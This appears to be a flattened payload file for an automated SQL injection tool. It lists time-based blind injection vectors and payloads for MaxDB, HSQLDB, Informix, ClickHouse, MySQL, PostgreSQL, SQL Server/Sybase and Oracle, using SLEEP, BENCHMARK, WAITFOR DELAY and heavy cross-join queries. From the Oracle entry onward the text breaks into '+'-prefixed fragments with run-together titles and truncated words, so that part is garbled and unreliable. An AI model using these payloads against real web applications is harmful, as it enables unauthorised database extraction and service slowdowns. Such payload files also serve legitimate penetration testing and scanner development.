-title SAP MaxDB AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 40=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (79)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (90)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (22)) AS T3)
-request
-payload AND 52=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
-comment --
-response
-time [DELAYED]
-details
-dbms SAP MaxDB
-title SAP MaxDB OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 57=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (27)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (12)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (33)) AS T3)
-request
-payload OR 37=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
-comment --
-response
-time [DELAYED]
-details
-dbms SAP MaxDB
-title HSQLDB >= 1.7.2 AND time-based blind (heavy query)
-stype 5
-level 4
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 'fHvr60d6A'=CASE WHEN (53) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(64),0),26000000000),NULL) ELSE '6UniTe3bk' END
-request
-payload AND 'v1IZl51fb'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(63),0),40000000000),NULL)
-response
-time 62
-details
-dbms HSQLDB
-dbms_version >= 1.7.2
-title HSQLDB >= 1.7.2 OR time-based blind (heavy query)
-stype 5
-level 4
-risk 3
-clause 1,2,3,9
-where 1
-vector OR '7z9kojber'=CASE WHEN (93) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(44),0),92000000000),NULL) ELSE 'NIpIdroxl' END
-request
-payload OR '9QOyixLh8'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(57),0),91000000000),NULL)
-response
-time 86
-details
-dbms HSQLDB
-dbms_version >= 1.7.2
-title HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 'vGtrx5BJG'=CASE WHEN (22) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(67),0),41000000000),NULL) ELSE 'm7q1DIsYc' END
-request
-payload AND 'q6FDG6OxW'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(44),0),9000000000),NULL)
-comment --
-response
-time [DELAYED]
-details
-dbms HSQLDB
-dbms_version >= 1.7.2
-title HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 'lsLDcnBb4'=CASE WHEN (81) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(94),0),69000000000),NULL) ELSE '9x5iS03e1' END
-request
-payload OR 'qjV3EINAY'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(81),0),98000000000),NULL)
-comment --
-response
-time [DELAYED]
-details
-dbms HSQLDB
-dbms_version >= 1.7.2
-title HSQLDB > 2.0 AND time-based blind (heavy query)
-stype 5
-level 4
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 'YqLANeHpE'=CASE WHEN (45) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),9900000000),NULL) ELSE 'OSc8inDqX' END
-request
-payload AND 'E0wyS4V2g'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),8700000000),NULL)
-response
-time 45
-details
-dbms HSQLDB
-dbms_version > 2.0
-title HSQLDB > 2.0 OR time-based blind (heavy query)
-stype 5
-level 4
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 'buQEjVW6w'=CASE WHEN (85) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),3400000000),NULL) ELSE 'sVguSmr0s' END
-request
-payload OR 'jcisGHSnp'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),7300000000),NULL)
-response
-time 35
-details
-dbms HSQLDB
-dbms_version > 2.0
-title HSQLDB > 2.0 AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 'rkX1jTvvR'=CASE WHEN (84) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),7300000000),NULL) ELSE 'lC8i2xvDV' END
-request
-payload AND 'VuzinQnqM'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),4100000000),NULL)
-comment --
-response
-time [DELAYED]
-details
-dbms HSQLDB
-dbms_version > 2.0
-title HSQLDB > 2.0 OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 'IACXB1QC0'=CASE WHEN (48) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),10000000000),NULL) ELSE 'dMa3TrV53' END
-request
-payload OR 'D7FnDr9Qz'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)
-comment --
-response
-time [DELAYED]
-details
-dbms HSQLDB
-dbms_version > 2.0
-title Informix AND time-based blind (heavy query)
-stype 5
-level 2
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 74=(CASE WHEN (9) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 76 END)
-request
-payload AND 24=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
-response
-time [DELAYED]
-details
-dbms Informix
-title Informix OR time-based blind (heavy query)
-stype 5
-level 2
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 83=(CASE WHEN (76) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 90 END)
-request
-payload OR 29=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
-response
-time [DELAYED]
-details
-dbms Informix
-title Informix AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 53=(CASE WHEN (61) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 60 END)
-request
-payload AND 27=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
-comment --
-response
-time [DELAYED]
-details
-dbms Informix
-title Informix OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 35=(CASE WHEN (51) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 56 END)
-request
-payload OR 21=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
-comment --
-response
-time [DELAYED]
-details
-dbms Informix
-title ClickHouse AND time-based blind (heavy query)
-stype 5
-level 4
-risk 1
-clause 1,2,3
-where 1
-vector AND 73=(SELECT COUNT(fuzzBits('054VkHdTF', 0.001)) FROM numbers(if((7), 1000000, 1)))
-request
-payload AND 59=(SELECT COUNT(fuzzBits('I9k5Iom0z', 0.001)) FROM numbers(1000000))
-response
-time [DELAYED]
-details
-dbms ClickHouse
-title ClickHouse OR time-based blind (heavy query)
-stype 5
-level 5
-risk 3
-clause 1,2,3
-where 1
-vector OR 73=(SELECT COUNT(fuzzBits('nWgdjlJza', 0.001)) FROM numbers(if((3), 1000000, 1)))
-request
-payload OR 56=(SELECT COUNT(fuzzBits('CmvcdPPJd', 0.001)) FROM numbers(1000000))
-response
-time [DELAYED]
-details
-dbms ClickHouse
-title MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
-stype 5
-level 3
-risk 2
-clause 1,2,3,4,5
-where 1
-vector PROCEDURE ANALYSE(EXTRACTVALUE(59,CONCAT('\',(IF((35),BENCHMARK(88000000,MD5('diB0u1ieT')),32)))),1)
-request
-payload PROCEDURE ANALYSE(EXTRACTVALUE(10,CONCAT('\',(BENCHMARK(67000000,MD5('mOiXZodEa'))))),1)
-response
-time 68
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)
-stype 5
-level 5
-risk 2
-clause 1,2,3,4,5
-where 1
-vector PROCEDURE ANALYSE(EXTRACTVALUE(70,CONCAT('\',(IF((33),BENCHMARK(48000000,MD5('MEIsQuHE5')),31)))),1)
-request
-payload PROCEDURE ANALYSE(EXTRACTVALUE(57,CONCAT('\',(BENCHMARK(99000000,MD5('KYwEk9Ies'))))),1)
-comment #
-response
-time 65
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 time-based blind - Parameter replace
-stype 5
-level 2
-risk 1
-clause 1,2,3,9
-where 3
-vector (CASE WHEN (64) THEN SLEEP(61) ELSE 6 END)
-request
-payload (CASE WHEN (90=40) THEN SLEEP(19) ELSE 90 END)
-response
-time 25
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
-stype 5
-level 3
-risk 1
-clause 1,2,3,9
-where 3
-vector (SELECT 27 FROM (SELECT(SLEEP(24-(IF(99,0,86)))))oXsqgNl0b)
-request
-payload (SELECT 81 FROM (SELECT(SLEEP(27)))O1eOP3ElC)
-response
-time 26
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)
-stype 5
-level 4
-risk 2
-clause 1,2,3,9
-where 3
-vector (CASE WHEN (39) THEN (SELECT BENCHMARK(56000000,MD5('gzqR7J4kN'))) ELSE 96)
-request
-payload (CASE WHEN (43=20) THEN (SELECT BENCHMARK(28000000,MD5('aYa37nfBp'))) ELSE 4)
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version < 5.0.12
-title MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 3
-vector IF((68),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),64)
-request
-payload (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version > 5.0.12
-title MySQL time-based blind - Parameter replace (bool)
-stype 5
-level 4
-risk 1
-clause 1,2,3,9
-where 3
-vector (44 AND SLEEP(6))
-request
-payload (31=63 AND SLEEP(37))
-response
-time 81
-details
-dbms MySQL
-title MySQL time-based blind - Parameter replace (ELT)
-stype 5
-level 5
-risk 1
-clause 1,2,3,9
-where 3
-vector ELT(20,SLEEP(67))
-request
-payload ELT(94=88,SLEEP(31))
-response
-time 54
-details
-dbms MySQL
-title MySQL time-based blind - Parameter replace (MAKE_SET)
-stype 5
-level 5
-risk 1
-clause 1,2,3,9
-where 3
-vector MAKE_SET(85,SLEEP(60))
-request
-payload MAKE_SET(21=30,SLEEP(66))
-response
-time 1
-details
-dbms MySQL
-title PostgreSQL > 8.1 time-based blind - Parameter replace
-stype 5
-level 3
-risk 1
-clause 1,2,3,9
-where 3
-vector (CASE WHEN (69) THEN (SELECT 33 FROM PG_SLEEP(92)) ELSE 92 END)
-request
-payload (SELECT 53 FROM PG_SLEEP(42))
-response
-time 16
-details
-dbms PostgreSQL
-dbms_version > 8.1
-title PostgreSQL time-based blind - Parameter replace (heavy query)
-stype 5
-level 4
-risk 2
-clause 1,2,3,9
-where 3
-vector (CASE WHEN (99) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,89000000)) ELSE 91 END)
-request
-payload (SELECT COUNT(*) FROM GENERATE_SERIES(1,74000000))
-response
-time [DELAYED]
-details
-dbms PostgreSQL
-title Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)
-stype 5
-level 4
-risk 2
-clause 1,3,9
-where 3
-vector (SELECT (CASE WHEN (59) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 53 END))
-request
-payload (SELECT (CASE WHEN (15=4) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 66 END))
-response
-time [DELAYED]
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)
-stype 5
-level 3
-risk 1
-clause 1,3,9
-where 3
-vector BEGIN IF (40) THEN DBMS_LOCK.SLEEP(36)
+ AND 81=IF((71),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),41)
+AND 16=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)ELAYED]
+dbms_version > 5.0.12MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)
+ OR 61=IF((27),BENCHMARK(7000000,MD5('g8QUmoq2Y')),89)
+OR 46=BENCHMARK(49000000,MD5('flYRjGGns'))ELAYED]
+dbms_version < 5.0.12MySQL > 5.0.12 OR time-based blind (heavy query - comment)
+ OR 77=IF((20),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),98)
+OR 21=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)ELAYED]
+dbms_version > 5.0.12MySQL >= 5.0.12 RLIKE time-based blind
+ RLIKE (SELECT 74=IF((95),SLEEP(68),77))
+RLIKE SLEEP(18)
+dbms_version >= 5.0.12MySQL >= 5.0.12 RLIKE time-based blind (comment)
+ RLIKE (SELECT 67=IF((23),SLEEP(70),32))
+RLIKE SLEEP(55)
+dbms_version >= 5.0.12MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)
+ RLIKE (SELECT 68 FROM (SELECT(SLEEP(20-(IF(96,0,76)))))995SI4dHY)
+RLIKE (SELECT 52 FROM (SELECT(SLEEP(41)))yg0s7Mc3t)
+dbms_version >= 5.0.12MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)
+ RLIKE (SELECT 52 FROM (SELECT(SLEEP(61-(IF(27,0,0)))))A3meJQLxE)
+RLIKE (SELECT 99 FROM (SELECT(SLEEP(6)))LBan7PAAX)
+dbms_version >= 5.0.12MySQL AND time-based blind (ELT)
+ AND ELT(60,SLEEP(56))
+AND ELT(19=96,SLEEP(14))
+dbms_version >= 5.0.12MySQL OR time-based blind (ELT)
+ OR ELT(20,SLEEP(76))
+OR ELT(72=99,SLEEP(37))MySQL AND time-based blind (ELT - comment)
+ AND ELT(94,SLEEP(19))
+AND ELT(27=9,SLEEP(56))MySQL OR time-based blind (ELT - comment)
+ OR ELT(98,SLEEP(25))
+OR ELT(95=51,SLEEP(40))PostgreSQL > 8.1 AND time-based blind
+ AND 85=(CASE WHEN (6) THEN (SELECT 99 FROM PG_SLEEP(13)) ELSE 44 END)
+AND 62=(SELECT 50 FROM PG_SLEEP(83))PostgreSQL > 8.1 OR time-based blind
+ OR 18=(CASE WHEN (50) THEN (SELECT 20 FROM PG_SLEEP(77)) ELSE 14 END)
+OR 82=(SELECT 37 FROM PG_SLEEP(46))PostgreSQL > 8.1 AND time-based blind (comment)
+ AND 66=(CASE WHEN (86) THEN (SELECT 73 FROM PG_SLEEP(20)) ELSE 9 END)
+AND 81=(SELECT 20 FROM PG_SLEEP(0))PostgreSQL > 8.1 OR time-based blind (comment)
+ OR 88=(CASE WHEN (54) THEN (SELECT 53 FROM PG_SLEEP(22)) ELSE 87 END)
+OR 97=(SELECT 96 FROM PG_SLEEP(11))
+ AND 93=(CASE WHEN (53) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,88000000)) ELSE 78 END)
+AND 7=(SELECT COUNT(*) FROM GENERATE_SERIES(1,8000000))PostgreSQL OR time-based blind (heavy query)
+ OR 21=(CASE WHEN (50) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,71000000)) ELSE 15 END)
+OR 47=(SELECT COUNT(*) FROM GENERATE_SERIES(1,51000000))
+ AND 30=(CASE WHEN (69) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,99000000)) ELSE 56 END)
+AND 57=(SELECT COUNT(*) FROM GENERATE_SERIES(1,47000000))PostgreSQL OR time-based blind (heavy query - comment)
+ OR 11=(CASE WHEN (30) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000)) ELSE 91 END)
+OR 96=(SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))
+ IF(64) WAITFOR DELAY '0:0:67'
+WAITFOR DELAY '0:0:16'
+IF(81) WAITFOR DELAY '0:0:31'
+WAITFOR DELAY '0:0:99'
+AND 68=(CASE WHEN (45) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 90 END)
+AND 56=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+OR 80=(CASE WHEN (37) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 56 END)
+OR 92=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+AND 65=(CASE WHEN (48) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 43 END)
+AND 75=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+OR 23=(CASE WHEN (2) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 61 END)
+OR 27=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+AND 17=(CASE WHEN (15) THEN DBMS_PIPE.RECEIVE_MESSAGE('NyM2twl1F',19) ELSE 6 END)
+AND 71=DBMS_PIPE.RECEIVE_MESSAGE('ttGvUZcaT',32)
+OR 99=(CASE WHEN (2) THEN DBMS_PIPE.RECEIVE_MESSAGE('B8B1B2Qc7',8) ELSE 86 END)
+OR 65=DBMS_PIPE.RECEIVE_MESSAGE('fL7gwzRfW',36)
+AND 89=(CASE WHEN (36) THEN DBMS_PIPE.RECEIVE_MESSAGE('E3Ri8ya5f',67) ELSE 99 END)
+AND 33=DBMS_PIPE.RECEIVE_MESSAGE('jho0p1Td2',69)
+OR 11=(CASE WHEN (15) THEN DBMS_PIPE.RECEIVE_MESSAGE('q9MO75xPH',33) ELSE 37 END)
+OR 47=DBMS_PIPE.RECEIVE_MESSAGE('RjG0zu3WN',2)
+AND 25=(CASE WHEN (60) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 84 END)
+AND 72=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
+OR 56=(CASE WHEN (12) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 37 END)
+OR 87=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
+AND 56=(CASE WHEN (35) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 56 END)
+AND 15=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
+OR 55=(CASE WHEN (73) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 47 END)
+OR 51=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
+AND 72=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (39))
+AND 90=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
+OR 21=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (43))
+OR 93=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
+AND 9=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (26))
+AND 0=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
+OR 76=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (99))
+OR 40=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
+AND 28=(CASE WHEN (51) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5900000000/2))))) ELSE 16 END)
+AND 72=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3500000000/2))))
+OR 29=(CASE WHEN (20) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2))))) ELSE 79 END)
+OR 99=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(9700000000/2))))
+AND 30=(CASE WHEN (74) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(4200000000/2))))) ELSE 37 END)
+AND 51=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(6300000000/2))))
+OR 100=(CASE WHEN (56) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1400000000/2))))) ELSE 60 END)
+OR 76=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(7500000000/2))))
+AND 66=IIF((68),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),27)
+AND 55=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
+OR 61=IIF((74),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),94)
+OR 29=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
+AND 91=IIF((98),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),49)
+AND 66=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
+OR 20=IIF((75),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),51)
+OR 38=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
+AND 90=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (37)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (18)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (68)) AS T3)
+AND 8=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
+OR 43=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (42)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (41)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (92)) AS T3)
+OR 81=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
+AND 40=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (79)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (90)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (22)) AS T3)
+AND 52=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
+OR 57=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (27)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (12)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (33)) AS T3)
+OR 37=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
+AND 'fHvr60d6A'=CASE WHEN (53) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(64),0),26000000000),NULL) ELSE '6UniTe3bk' END
+AND 'v1IZl51fb'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(63),0),40000000000),NULL)
+OR '7z9kojber'=CASE WHEN (93) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(44),0),92000000000),NULL) ELSE 'NIpIdroxl' END
+OR '9QOyixLh8'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(57),0),91000000000),NULL)
+AND 'vGtrx5BJG'=CASE WHEN (22) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(67),0),41000000000),NULL) ELSE 'm7q1DIsYc' END
+AND 'q6FDG6OxW'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(44),0),9000000000),NULL)
+OR 'lsLDcnBb4'=CASE WHEN (81) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(94),0),69000000000),NULL) ELSE '9x5iS03e1' END
+OR 'qjV3EINAY'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(81),0),98000000000),NULL)
+AND 'YqLANeHpE'=CASE WHEN (45) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),9900000000),NULL) ELSE 'OSc8inDqX' END
+AND 'E0wyS4V2g'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),8700000000),NULL)
+OR 'buQEjVW6w'=CASE WHEN (85) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),3400000000),NULL) ELSE 'sVguSmr0s' END
+OR 'jcisGHSnp'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),7300000000),NULL)
+AND 'rkX1jTvvR'=CASE WHEN (84) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),7300000000),NULL) ELSE 'lC8i2xvDV' END
+AND 'VuzinQnqM'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),4100000000),NULL)
+OR 'IACXB1QC0'=CASE WHEN (48) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),10000000000),NULL) ELSE 'dMa3TrV53' END
+OR 'D7FnDr9Qz'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)
+AND 74=(CASE WHEN (9) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 76 END)
+AND 24=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
+OR 83=(CASE WHEN (76) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 90 END)
+OR 29=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
+AND 53=(CASE WHEN (61) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE 60 END)
+AND 27=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
